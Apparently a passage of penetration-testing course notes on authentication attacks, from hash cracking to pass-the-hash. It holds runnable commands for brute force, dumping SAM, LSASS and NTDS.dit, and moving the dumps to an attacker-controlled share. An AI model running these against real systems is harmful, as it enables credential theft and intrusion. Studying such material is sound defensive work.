# Attacking Authentication Mechanisms

## Introduction

Authentication validates identity via one or more factors: something you know (password), have (smart card), are (biometric), or where you are (location). Authorization grants permissions after successful authentication.

### The use of passwords

Password reuse across accounts is common (~66%). HaveIBeenPwned checks if an email appears in known breaches.

## Introduction to Password Cracking

Hashing transforms input into a fixed-size output (MD5, SHA-256). Password cracking reverses hashes via rainbow tables, dictionary attacks, or brute-force.

### Rainbow tables

Precompiled hash-to-password maps for fast lookup. Defeated by salting (random bytes added before hashing, ideally unique per password).

```bash
echo -n <PASSWORD> | md5sum # unsalted
echo -n <PASSWORD> | sha256sum
echo -n <SALT><PASSWORD> | md5sum # salted, salt prepended
```

Salt is not secret, but must be known to verify logins, so it's typically stored prepended to the hash.

### Brute-force attack

Tries every possible combination. 100% effective given enough time but slow for long passwords; mostly replaced by mask attacks. Short passwords (<9 chars) remain viable targets even on consumer hardware.

Cracking speed depends heavily on hash algorithm and hardware (e.g. hashcat: ~5M/s for MD5 vs ~10k/s for DCC2 on the same machine).

### Dictionary attack

Tests statistically likely passwords from a wordlist instead of all combinations. Efficient under time constraints.

Wordlists: `rockyou.txt`, SecLists. rockyou.txt (`/usr/share/wordlists/rockyou.txt`) holds 14M+ real leaked passwords from the 2009 RockYou breach, originally stored unencrypted.

## Introduction to John The Ripper

John the Ripper (JtR / john) cracks passwords via brute-force and dictionary attacks. The "jumbo" variant adds performance, multilingual wordlists, and 64-bit support.

### Cracking modes

#### Single crack mode

Rule-based mode generating candidates from the target's username, home directory, and GECOS fields (full name, etc.). Best for Linux credentials.

```bash
john --single <TARGET_FILE>
john <hash_file> --show # display cracked passwords reliably
```

#### Wordlist mode

Dictionary attack against hash(es). Wordlist must be plaintext, one word per line. Multiple lists separated by commas.

```bash
john --wordlist=<WORDLIST> <hash_file>
```

`--rules` apply transformation rules (custom or built-in) to generate more candidates

#### Incremental mode

Brute-force mode using a statistical (Markov chain) model to prioritize likely passwords over all combinations of a charset. Most exhaustive and slowest mode; doesn't use a wordlist.

```bash
john --incremental <hash_file>
```

`/etc/john/john.conf` incremental charset/length config | sections `[Incremental:Custom]` `[Incremental:UTF8]` `[Incremental:Latin1]` `[Incremental:ASCII]`

### Identifying hash formats

Unknown hash formats can be checked against JtR's sample hash docs, the PentestMonkey hash list, or identified with hashID.

```bash
hashid -j <HASH>
```

`-j` also show the corresponding JtR `--format` value

```bash
john --format=<FORMAT> [...] <hash_file>
```

`afs` AFS | `bfegg` Eggdrop IRC | `bf` Blowfish crypt(3) | `bsdi` BSDi crypt(3) | `crypt` Unix crypt(3) | `des` DES crypt(3) | `dmd5` Dragonfly BSD MD5 | `dominosec` Domino 6/7  
`episerver` EPiServer SID | `hdaa` Openwall GNU/Linux | `hmac-md5` HMAC-MD5 | `hmailserver` hMailServer | `ipb2` Invision Power Board 2 | `krb4` Kerberos 4 | `krb5` Kerberos 5 | `LM` LAN Manager  
`lotus5` Domino 5 | `mscash` MS Cache | `mscash2` MS Cache v2 | `mschapv2` MS CHAPv2 | `mskrb5` MS Kerberos 5 | `mssql05` MSSQL 2005 | `mssql` MSSQL | `mysql-fast` MySQL fast  
`mysql` MySQL | `mysql-sha1` MySQL SHA1 | `netlm` NETLM | `netlmv2` NETLMv2 | `netntlm` NETNTLM | `netntlmv2` NETNTLMv2 | `nethalflm` NEThalfLM | `md5ns` MD5 namespace  
`nsldap` OpenLDAP SHA | `ssha` Salted SHA | `NT` Windows NT | `openssha` OpenSSH key | `oracle11` Oracle 11 | `oracle` Oracle | `pdf` PDF | `phpass-md5` PHPass  
`phps` PHPS | `pix-md5` Cisco PIX MD5 | `po` Sybase SQL Anywhere | `rar` WinRAR | `raw-md4` Raw MD4 | `raw-md5` Raw MD5 | `raw-md5-unicode` Raw MD5 Unicode | `raw-sha1` Raw SHA1  
`raw-sha224` Raw SHA224 | `raw-sha256` Raw SHA256 | `raw-sha384` Raw SHA384 | `raw-sha512` Raw SHA512 | `salted-sha` Salted SHA | `sapb` SAP CODVN B | `sapg` SAP CODVN G | `sha1-gen` Generic SHA1  
`skey` S/Key OTP | `ssh` SSH key | `sybasease` Sybase ASE | `xsha` Extended SHA | `zip` WinZip

### Cracking files

"2john" tools convert protected files into JtR-crackable hash files.

```bash
<tool> <TARGET_FILE> > <OUTPUT_FILE>.hash
locate *2john*
```

`locate *2john*` finds all installed 2john converters (bitlocker2john, dmg2john, gpg2john, 7z2john.pl, DPAPImk2john.py, etc.)

`pdf2john` PDF | `ssh2john` SSH keys | `mscash2john` MS Cash | `keychain2john` OS X keychain | `rar2john` RAR | `pfx2john` PKCS#12 | `truecrypt_volume2john` TrueCrypt | `keepass2john` KeePass | `vncpcap2john` VNC PCAP | `putty2john` PuTTY key | `zip2john` ZIP | `hccap2john` WPA/WPA2 handshake | `office2john` MS Office | `wpa2john` WPA/WPA2 handshake

## Introduction to Hashcat

GPU-accelerated password cracker for Linux/Windows/macOS. Supports dictionary, mask, combinator, and association attack modes.

```bash
hashcat -a <MODE> -m <HASH_TYPE> <hashes> [wordlist, rule, mask, ...]
```

`-a` attack mode | `-m` hash type

### Hash types

hashcat assigns numeric IDs to hash types.

```bash
hashid -m '<HASH>'
```

`hashcat --help` lists all hash mode IDs; hashcat.net hosts example hashes for manual identification.

### Attack modes

#### Dictionary attack

`-a 0`. Tests each wordlist entry as a candidate password.

```bash
hashcat -a 0 -m <HASH_TYPE> <HASH> /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m <HASH_TYPE> <HASH> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

`-r` apply a rule file. Rule files live under `/usr/share/hashcat/rules/`; `best64.rule` applies 64 common transformations (leetspeak, appended numbers, etc.)

#### Mask attack

`-a 3`. Brute-force with an explicitly defined keyspace per character position.

`?l` a-z | `?u` A-Z | `?d` 0-9 | `?h` 0-9a-f | `?H` 0-9A-F | `?s` space/symbols | `?a` ?l?u?d?s | `?b` 0x00-0xff

Custom charsets: `-1` `-2` `-3` `-4` define, referenced as `?1` `?2` `?3` `?4`

```bash
hashcat -a 3 -m <HASH_TYPE> '<HASH>' '<MASK>'
```

Example mask `?u?l?l?l?l?d?s` = 1 uppercase, 4 lowercase, 1 digit, 1 symbol.

## Writing Custom Wordlists and Rules

Password policies push users toward predictable patterns (company name, pet, year, month); OSINT can surface these. Common additions: `Password` capitalized | `Password123` + numbers | `Password2022` + year | `Password02` + month | `Password2022!` + trailing `!` | `P@ssw0rd2022!` + leetspeak+special

Hashcat rule functions: `:` no-op | `l` lowercase all | `u` uppercase all | `c` capitalize first | `sXY` replace X with Y | `$!` append `!`

```bash
hashcat --force <WORDLIST> -r <RULEFILE> --stdout | sort -u > <OUTPUT_FILE>
```

One input word can produce many mutated variants this way. `best64.rule` is a widely effective pre-built ruleset.

### Generating wordlists using CeWL

Scrapes words from a target website to build a tailored wordlist.

```bash
cewl <URL> -d <DEPTH> -m <MIN_LENGTH> --lowercase -w <OUTPUT_FILE>
```

`-d` spider depth | `-m` minimum word length | `--lowercase` store lowercase | `-w` output file

## Cracking Protected Files

Files/archives are often encrypted (AES-256 symmetric common) but still crackable with the right wordlist/tools. GDPR requires encryption of personal data in transit and at rest in the EU.

### Hunting for Encrypted Files

Search by known encrypted-file extensions (reference: FileInfo).

```bash
for ext in <EXT_LIST>;do find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core";done
```

### Hunting for SSH keys

SSH keys lack a standard extension; identify by header/footer content.

```bash
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```

Modern SSH key format looks identical whether encrypted or not (older PEM headers showed the encryption method in the header).

```bash
ssh-keygen -yf <TARGET_FILE>
```

Prompts for a passphrase if the key is password-protected; no prompt if unencrypted.

### Cracking encrypted SSH keys

```bash
ssh2john.py <TARGET_FILE> > <OUTPUT_FILE>.hash
john --wordlist=<WORDLIST> <OUTPUT_FILE>.hash
john <OUTPUT_FILE>.hash --show
```

### Cracking password-protected documents

```bash
office2john.py <TARGET_FILE> > <OUTPUT_FILE>.hash
pdf2john.py <TARGET_FILE> > <OUTPUT_FILE>.hash
john --wordlist=<WORDLIST> <OUTPUT_FILE>.hash
john <OUTPUT_FILE>.hash --show
```

## Cracking Protected Archives

Archives (zip, rar, 7z, tar, etc.) are often password-protected. Not all archive types natively support passwords (e.g. TAR is commonly encrypted via openssl or gpg instead).

### Cracking ZIP files

```bash
zip2john <TARGET_FILE>.zip > <OUTPUT_FILE>.hash
john --wordlist=<WORDLIST> <OUTPUT_FILE>.hash
john <OUTPUT_FILE>.hash --show
```

### Cracking OpenSSL encrypted GZIP files

`file` reveals openssl-encrypted format when the extension doesn't indicate it.

```bash
file <TARGET_FILE>
for i in $(cat <WORDLIST>);do openssl enc -aes-256-cbc -d -in <TARGET_FILE> -k $i 2>/dev/null| tar xz;done
```

The loop produces many harmless gzip/tar errors; success shows as a newly extracted file in the cwd.

### Cracking BitLocker-encrypted drives

Windows full-disk encryption, AES 128/256-bit. Forgotten passwords are recoverable via a 48-digit recovery key. bitlocker2john extracts 4 hashes (2 for password, 2 for recovery key); focus on `$bitlocker$0$` since the recovery key is impractical to brute-force.

```bash
bitlocker2john -i <TARGET_FILE>.vhd > <OUTPUT_FILE>.hashes
grep "bitlocker\$0" <OUTPUT_FILE>.hashes > <OUTPUT_FILE>.hash
hashcat -a 0 -m 22100 '<HASH>' <WORDLIST>
```

Hashcat mode for `$bitlocker$0$...` hashes is 22100.

### Mounting BitLocker-encrypted drives in Linux (or macOS)

```bash
sudo apt-get install dislocker
sudo mkdir -p /media/bitlocker
sudo mkdir -p /media/bitlockermount
sudo losetup -f -P <TARGET_FILE>.vhd
sudo dislocker /dev/loop0p2 -u<PASSWORD> -- /media/bitlocker
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
sudo umount /media/bitlockermount
sudo umount /media/bitlocker
```

## Network Services

Network services (FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC, Telnet, SMTP, LDAP) authenticate via username/password by default unless key-based auth is configured.

### WinRM

Microsoft's WS-Management implementation for remote Windows management (XML/SOAP based). Ports 5985 (HTTP) / 5986 (HTTPS). Must be manually enabled on Windows 10/11.

#### NetExec

Multi-protocol tool (SMB, LDAP, MSSQL, WinRM, etc.) for password attacks and enumeration.

```bash
sudo apt-get -y install netexec
netexec <proto> <TARGET_IP> -u <USERNAME> -p <PASSWORD>
netexec winrm <TARGET_IP> -u <USER_LIST> -p <PASS_LIST>
```

`(Pwn3d!)` in output means command execution is likely possible with that credential.

#### Evil-WinRM

```bash
sudo gem install evil-winrm
evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>
```

Starts a PowerShell Remoting Protocol (MS-PSRP) session on success.

### SSH

Remote shell/file transfer, TCP port 22 default. Uses symmetric encryption for session data (key exchanged via Diffie-Hellman), asymmetric encryption for authentication, and hashing to confirm message authenticity.

#### Hydra - SSH

```bash
hydra -L <USER_LIST> -P <PASS_LIST> ssh://<TARGET_IP>
ssh <USERNAME>@<TARGET_IP>
```

### Remote Desktop Protocol (RDP)

Microsoft remote GUI access protocol, TCP port 3389 default.

#### Hydra - RDP

```bash
hydra -L <USER_LIST> -P <PASS_LIST> rdp://<TARGET_IP>
```

RDP servers reject many parallel connections: reduce threads (`-t 1` or `-t 4`) and add wait time (`-W`).

#### xFreeRDP

```bash
xfreerdp /v:<TARGET_IP> /u:<USERNAME> /p:<PASSWORD>
```

### SMB

File/printer sharing protocol for Windows networks, aka CIFS. Samba is the open-source implementation.

#### Hydra - SMB

```bash
hydra -L <USER_LIST> -P <PASS_LIST> smb://<TARGET_IP>
```

Outdated Hydra throws "invalid reply" against SMBv3; update/recompile hydra or use Metasploit instead.

#### Metasploit - smb_login

```bash
msfconsole -q
```

```text
use auxiliary/scanner/smb/smb_login
set user_file <USER_LIST>
set pass_file <PASS_LIST>
set rhosts <TARGET_IP>
run
```

#### NetExec - SMB shares

```bash
netexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> --shares
```

#### Smbclient

```bash
smbclient -U <USERNAME> \\\\<TARGET_IP>\\<SHARE>
```

## Spraying, Stuffing, and Defaults

Variants of brute-force attacks: one password across many accounts, reused credential pairs, or default vendor credentials.

### Password spraying

Single password tried across many accounts. Effective where accounts are provisioned with a default/standard password.

```bash
netexec smb <TARGET_IP>/24 -u <USER_LIST> -p '<PASSWORD>'
```

Burp Suite is common for web app spraying; NetExec/Kerbrute for AD.

### Credential stuffing

Reuse of stolen username:password pairs from one breach against other services.

```bash
hydra -C <USERPASS_LIST> ssh://<TARGET_IP>
```

### Default credentials

```bash
pip3 install defaultcreds-cheat-sheet
creds search <PRODUCT>
```

Default-credential lists also exist publicly for routers by brand/model.
## Windows Authentication Process

Windows local interactive logon involves WinLogon, LogonUI, credential providers, LSASS, authentication packages, and SAM or Active Directory. Kerberos is the primary AD authentication mechanism. LSA authenticates users, manages local logins, and translates between usernames and SIDs.

WinLogon intercepts keyboard logon requests via RPC from Win32k.sys, launches LogonUI, and passes collected credentials to LSASS.

### LSASS

Core authentication process at `%SystemRoot%\System32\Lsass.exe`. Enforces local security policy, authenticates users, forwards security audit logs.

`Lsasrv.dll` LSA server, selects NTLM or Kerberos | `Msv1_0.dll` local machine logons | `Samsrv.dll` local SAM accounts/policies | `Kerberos.dll` Kerberos auth | `Netlogon.dll` network logon | `Ntdsa.dll` manages ntds.dit, LDAP queries, replication (DC only)

### SAM database

Stores local user credential hashes (LM or NTLM) at `%SystemRoot%\system32\config\SAM`, mounted under `HKLM\SAM`. Requires SYSTEM privileges to access. SYSKEY partially encrypts the SAM file on disk with a system-generated key.

Workgroup systems validate against local SAM; domain-joined systems validate against the DC's Active Directory.

### Credential Manager

Stores credentials for network resources, websites, and apps per user profile, encrypted in the Credential Locker.

```powershell
%UserProfile%\AppData\Local\Microsoft\[Vault/Credentials]\
```

### NTDS

`NTDS.dit` on Domain Controllers stores AD data: user accounts (username & password hash), group accounts, computer accounts, GPOs. Synchronized across DCs (except RODCs).

## Attacking SAM, SYSTEM, and SECURITY

`HKLM\SAM` local user password hashes | `HKLM\SYSTEM` boot key, used to encrypt SAM | `HKLM\SECURITY` LSA data: cached domain creds (DCC2), cleartext passwords, DPAPI keys

### Using reg.exe to copy registry hives

Requires local admin, elevated cmd.exe.

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

SAM+SYSTEM alone suffice for local hashes; SECURITY adds cached domain creds and other secrets.

### Creating a share with smbserver

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <SHARE> <OUTPUT_FILE>
```

`-smb2support` needed since SMBv1 is disabled by default on newer Windows.

### Moving hive copies to share

```cmd
move sam.save \\<ATTACKER_IP>\<SHARE>
move security.save \\<ATTACKER_IP>\<SHARE>
move system.save \\<ATTACKER_IP>\<SHARE>
```

### Dumping hashes with secretsdump

```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

bootKey (from SYSTEM) is retrieved first to decrypt SAM. Output format `uid:rid:lmhash:nthash`. Modern Windows stores NT hashes; pre-Vista/2008 may use weaker LM hashes.

### Cracking hashes with Hashcat

```bash
sudo hashcat -m 1000 <TARGET_FILE> /usr/share/wordlists/rockyou.txt
```

Mode 1000 = NT hashes.

### DCC2 hashes

Cached domain logon creds in `hklm\security`, format `domain/user:$DCC2$10240#user#hash`. Much slower to crack than NT hashes (PBKDF2-based, ~800x slower than NTLM on same hardware). Cannot be used for Pass-the-Hash.

```bash
hashcat -m 2100 '<HASH>' /usr/share/wordlists/rockyou.txt
```

Mode 2100 = DCC2.

### DPAPI

Encrypts per-user data blobs for apps like browsers, Outlook, RDP, Credential Manager. Machine/user DPAPI keys dumped from `hklm\security` enable decryption.

```cmd
mimikatz.exe
dpapi::chrome /in:"<TARGET_FILE>" /unprotect
```

### Dumping LSA secrets remotely

```bash
netexec smb <TARGET_IP> --local-auth -u <USERNAME> -p <PASSWORD> --lsa
```

### Dumping SAM Remotely

```bash
netexec smb <TARGET_IP> --local-auth -u <USERNAME> -p <PASSWORD> --sam
```

## Attacking LSASS

LSASS caches credentials in memory, creates access tokens, enforces security policies, writes security logs.

### Task Manager method

Right-click Local Security Authority Process in Task Manager > Create dump file. Produces `lsass.DMP` in `%temp%`. Requires GUI access.

### Rundll32.exe & Comsvcs.dll method

Faster, CLI-only, but flagged as malicious by modern AV.

```cmd
tasklist /svc
```

Finds lsass.exe PID via cmd.

```powershell
Get-Process lsass
```

Finds lsass.exe PID via PowerShell.

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

### Using Pypykatz to extract credentials

Python implementation of Mimikatz, runs on Linux against a dump file.

```bash
pypykatz lsa minidump <TARGET_FILE>
```

#### MSV

Authentication package LSA uses to validate against SAM. Yields Username, Domain, SID, NT & SHA1 hash from active logon sessions.

#### WDIGEST

Older auth protocol, default-enabled on Windows XP-8 / Server 2003-2012. Caches credentials in cleartext in LSASS. Disabled by default on modern Windows; Microsoft released a patch for affected systems.

#### Kerberos

Caches passwords, ekeys, tickets, pins for domain-joined logons. Extractable from LSASS memory for reuse against other domain systems.

#### DPAPI

Mimikatz/Pypykatz can extract the DPAPI masterkey from LSASS memory for logged-on users, used to decrypt DPAPI-protected app secrets.

### Cracking the NT Hash with Hashcat

```bash
sudo hashcat -m 1000 <HASH> /usr/share/wordlists/rockyou.txt
```

## Attacking Windows Credential Manager

Stores credentials encrypted under user/system profiles:

```text
%UserProfile%\AppData\Local\Microsoft\Vault\
%UserProfile%\AppData\Local\Microsoft\Credentials\
%UserProfile%\AppData\Roaming\Microsoft\Vault\
%ProgramData%\Microsoft\Vault\
%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\
```

Each vault has a `Policy.vpol` file with AES keys protected by DPAPI. Credential Guard (newer Windows) further protects DPAPI master keys via VBS.

`Web Credentials` IE/legacy Edge site logins | `Windows Credentials` OneDrive, domain user, network resource, service creds

### Exporting Windows Vaults

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```

Exports to password-protected `.crd` files, importable on other systems.

### Enumerating credentials with cmdkey

```cmd
cmdkey /list
```

`Target` resource/account name | `Type` Generic or Domain Password | `User` associated account | `Persistence` Local machine persistence = survives reboot

`virtualapp/didlogical` target is a generic MS account credential, usually irrelevant. A `Domain:interactive=` target can be impersonated:

```cmd
runas /savecred /user:<DOMAIN>\<USERNAME> cmd
```

### Extracting credentials with Mimikatz

```cmd
mimikatz.exe
privilege::debug
sekurlsa::credman
```

Dumps credman creds from LSASS memory. Alternative: `dpapi` module for manual decryption. Other tools: SharpDPAPI, LaZagne, DonPAPI.

## Attacking Active Directory and NTDS.dit

Domain-joined systems send auth requests to the DC rather than checking local SAM, though local SAM accounts remain usable (`HOSTNAME\user` or `.\` at logon UI).

### Dictionary attacks against AD accounts using NetExec

Noisy, can trigger lockout policies. Tailor attacks using OSINT on employee names and naming conventions.

`firstinitiallastname` jdoe | `firstinitialmiddleinitiallastname` jjdoe | `firstnamelastname` janedoe | `firstname.lastname` jane.doe | `lastname.firstname` doe.jane

Username structure often inferable from email addresses (`user@domain`).

### Creating a custom list of usernames

```bash
./username-anarchy -i <TARGET_FILE>
```

Converts real names into common username format permutations.

### Enumerating valid usernames with Kerbrute

```bash
./kerbrute_linux_amd64 userenum --dc <DC_IP> --domain <TARGET_DOMAIN> <TARGET_FILE>
```

### Launching a brute-force attack with NetExec

```bash
netexec smb <DC_IP> -u <USERNAME> -p <WORDLIST>
```

Default group policies do not enforce account lockout, so this attack can succeed undetected on many environments (as of writing).

### Capturing NTDS.dit

`NTDS.dit` at `%systemroot%/ntds` on DCs, holds all domain usernames, password hashes, schema data. Requires local admin or Domain Admin rights to capture.

```bash
evil-winrm -i <DC_IP> -u <USERNAME> -p '<PASSWORD>'
```

```cmd
net localgroup
```

Check local group membership (need Administrators or Domain Admins).

```cmd
net user <USERNAME>
```

Check domain privileges.

```powershell
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
cmd.exe /c move C:\NTDS\NTDS.dit \\<ATTACKER_IP>\<SHARE>
```

VSS (Volume Shadow Copy) lets the locked NTDS.dit be copied while in use. NTDS.dit hashes are encrypted with a key in SYSTEM — both files are required.

### Extracting hashes from NTDS.dit

```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

### A faster method: Using NetExec to capture NTDS.dit

```bash
netexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> -M ntdsutil
```

Automates VSS creation, dump, and transfer in one command.

### Pass the Hash (PtH) considerations

If a hash can't be cracked, it can still authenticate directly via NTLM.

```bash
evil-winrm -i <TARGET_IP> -u <USERNAME> -H <HASH>
```

## Credential Hunting in Windows

Base search strategy on the target system's role/user (e.g. IT admin workstation).

Key terms: Passwords, Passphrases, Keys, Username, User account, Creds, Users, Passkeys, configuration, dbcredential, dbpassword, pwd, Login, Credentials

### LaZagne

`browsers` Chromium, Firefox, Edge, Opera | `chats` Skype etc. | `mails` Outlook, Thunderbird | `memory` KeePass, LSASS dumps | `sysadmin` OpenVPN, WinSCP configs | `windows` LSA secrets, Credential Manager | `wifi` WiFi credentials

Supports 35 browsers on Windows. Related standalone decryptors: firefox_decrypt, decrypt-chrome-passwords.

```cmd
start LaZagne.exe all
```

`-vv` verbose, shows all attempted modules.

### findstr

```cmd
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

### Additional considerations

Other common credential locations: GPO/scripts in SYSVOL, IT share scripts, web.config on dev machines, unattend.xml, AD description fields, KeePass databases, files named pass.txt/passwords.docx/passwords.xlsx.

## Linux Authentication Process

PAM (`pam_unix.so`, typically in `/usr/lib/x86_64-linux-gnu/security/`) manages user info, authentication, sessions, password changes via `/etc/passwd` and `/etc/shadow`.

### Passwd file

World-readable, 7 colon-separated fields: username:password:uid:gid:gecos:home:shell. Password field usually `x` (hash stored in shadow instead). Rare/legacy systems may store the hash directly here.

```bash
head -n 1 /etc/passwd
```

If `/etc/passwd` is writable, the password field for root can be blanked (`root::0:0:...`), removing the password prompt entirely for root login via `su`.

### Shadow file

9 colon-separated fields, readable only by privileged users: username:password:lastchange:minage:maxage:warn:inactive:expire:reserved.

`!` or `*` in password field = no Unix password login (other methods like Kerberos/keys still work). Empty field = no password required.

Format: `$<id>$<salt>$<hashed>`

`1` MD5 | `2a` Blowfish | `5` SHA-256 | `6` SHA-512 | `sha1` SHA1crypt | `y` Yescrypt | `gy` Gost-yescrypt | `7` Scrypt

Yescrypt is now default on many distros (e.g. Debian); older systems may use weaker algorithms.

### Opasswd

Stores previous password hashes to prevent reuse, root-readable only.

```bash
sudo cat /etc/security/opasswd
```

Entries comma-separated; weaker hash types (e.g. MD5 `$1$`) among them are easier to crack and can reveal reuse patterns.

### Cracking Linux Credentials

`unshadow` (JtR) merges passwd + shadow into one crackable file.

```bash
sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```

This is the scenario JtR's single crack mode is designed for.

## Credential Hunting in Linux

Credential sources fall into four categories: files (configs, databases, notes, scripts, source code, cronjobs, SSH keys), history (logs, command-line history), memory (cache, in-memory processing), key-rings (browser stored credentials).

### Files

Config file extensions: `.config` `.conf` `.cnf` (not mandatory, can be renamed).

```bash
for l in <EXT_LIST>;do find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core";done
```

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

Searches found config files for credential keywords.

### Searching for databases

```bash
for l in <EXT_LIST>;do find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

DB extensions: `.sql` `.db` `.*db` `.db*`

### Searching for notes

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

Finds .txt files and extensionless files.

### Searching for scripts

```bash
for l in <EXT_LIST>;do find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

Script extensions: `.py` `.pyc` `.pl` `.go` `.jar` `.c` `.sh`

### Enumerating cronjobs

System-wide: `/etc/crontab`, `/etc/cron.d/`, `/etc/cron.{hourly,daily,weekly,monthly}`.

```bash
cat /etc/crontab
```

### Enumerating history files

```bash
tail -n5 /home/*/.bash*
```

Checks `.bash_history`, `.bashrc`, `.bash_profile` for leaked commands/credentials.

### Enumerating log files

`/var/log/messages` generic activity | `/var/log/syslog` generic activity | `/var/log/auth.log` (Debian) auth logs | `/var/log/secure` (RedHat/CentOS) auth logs | `/var/log/boot.log` boot info | `/var/log/dmesg` hardware/driver info | `/var/log/kern.log` kernel warnings/errors | `/var/log/faillog` failed logins | `/var/log/cron` cronjob info | `/var/log/mail.log` mail server | `/var/log/httpd` Apache logs | `/var/log/mysqld.log` MySQL logs

```bash
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```

### Memory and cache

#### Mimipenguin

Requires root.

```bash
sudo python3 mimipenguin.py
```

#### LaZagne

Sources (not limited to): Wifi, Wpa_supplicant, Libsecret, Kwallet, Chromium-based, CLI, Mozilla, Thunderbird, Git, ENV variables, Grub, Fstab, AWS, Filezilla, Gftp, SSH, Apache, Shadow, Docker, Keepass, Mimipy, Sessions, Keyrings

```bash
sudo python2.7 laZagne.py all
```

### Browser credentials

Firefox stores encrypted creds in `logins.json` under the profile folder.

```bash
cat .mozilla/firefox/<profile>/logins.json | jq .
```

```bash
python3.9 firefox_decrypt.py
```

Decrypts Firefox-stored credentials. Needs Python 3.9 (or Firefox Decrypt 0.7.0 with Python 2).

```bash
python3 laZagne.py browsers
```

## Credential Hunting in Network Traffic

Unencrypted protocols still appear in legacy/misconfigured/test environments despite TLS adoption.

`HTTP`→HTTPS web pages/resources | `FTP`→FTPS/SFTP file transfer | `SNMP`→SNMPv3 device monitoring | `POP3`→POP3S email retrieval | `IMAP`→IMAPS email access | `SMTP`→SMTPS email sending | `LDAP`→LDAPS directory queries | `RDP`→RDP+TLS remote desktop | `DNS`→DoH name resolution | `SMB`→SMB 3.0+TLS file sharing | `VNC`→VNC+TLS/SSL remote control

### Wireshark

`ip.addr == <IP>` specific IP | `tcp.port == <PORT>` specific port | `http` HTTP traffic | `dns` DNS traffic | `tcp.flags.syn == 1 && tcp.flags.ack == 0` SYN packets (scan/connection detection) | `icmp` ICMP/ping | `http.request.method == "POST"` HTTP POST (may carry creds) | `tcp.stream eq <N>` specific TCP stream | `eth.addr == <MAC>` specific MAC | `ip.src == <IP> && ip.dst == <IP>` traffic between two hosts

Content search: `http contains "passw"`, or Edit > Find Packet.

### Pcredz

Extracts from live traffic or pcaps: credit card numbers, POP/SMTP/IMAP/FTP credentials, SNMP community strings, HTTP NTLM/Basic/Form credentials, NTLMv1/v2 hashes (DCE-RPC, SMBv1/2, LDAP, MSSQL, HTTP), Kerberos AS-REQ Pre-Auth etype 23 hashes

```bash
./Pcredz -f <TARGET_FILE> -t -v
```

## Credential Hunting in Network Shares

Patterns to search for: keywords (`passw`, `user`, `token`, `key`, `secret`); extensions `.ini` `.cfg` `.env` `.xlsx` `.ps1` `.bat`; filenames containing `config`, `user`, `passw`, `cred`, `initial`; domain-specific strings (e.g. `INLANEFREIGHT\`); localize keywords to target's language. Prioritize IT shares over low-value shares (e.g. photos).

```powershell
Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern <PATTERN>
```

### Hunting from Windows

#### Snaffler

Domain-joined C# tool, auto-discovers shares and searches for interesting files.

```cmd
Snaffler.exe -s
```

`-u` retrieve AD users and search for references to them | `-i` / `-n` include/exclude specific shares

#### PowerHuntShares

Doesn't require domain-joined host. Generates an HTML summary report.

```powershell
Invoke-HuntSMBShares -Threads 100 -OutputDirectory <OUTPUT_FILE>
```

### Hunting from Linux

#### MANSPIDER

Scans SMB shares remotely; run via official Docker container to avoid dependency issues.

```bash
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <TARGET_IP> -c '<PATTERN>' -u '<USERNAME>' -p '<PASSWORD>'
```

#### NetExec

```bash
nxc smb <TARGET_IP> -u <USERNAME> -p '<PASSWORD>' --spider <SHARE> --content --pattern "<PATTERN>"
```

## Pass the Hash (PtH)

Uses a password hash directly for authentication instead of the plaintext password. Exploits the fact the hash is static per session until password change. Requires admin/specific privileges to obtain the hash (dump SAM, extract NTDS.dit, pull from LSASS).

### Introduction to Windows NTLM

Challenge-response SSO protocol. Passwords are not salted server/DC-side, so a captured hash can authenticate without the plaintext password (PtH). Kerberos is the default AD mechanism since Windows 2000, but NTLM remains supported for compatibility.

### Pass the Hash with Mimikatz (Windows)

`/user` user to impersonate | `/rc4` or `/NTLM` NTLM hash | `/domain` target domain (use computer name, localhost, or `.` for local account) | `/run` program to run (default cmd.exe)

```cmd
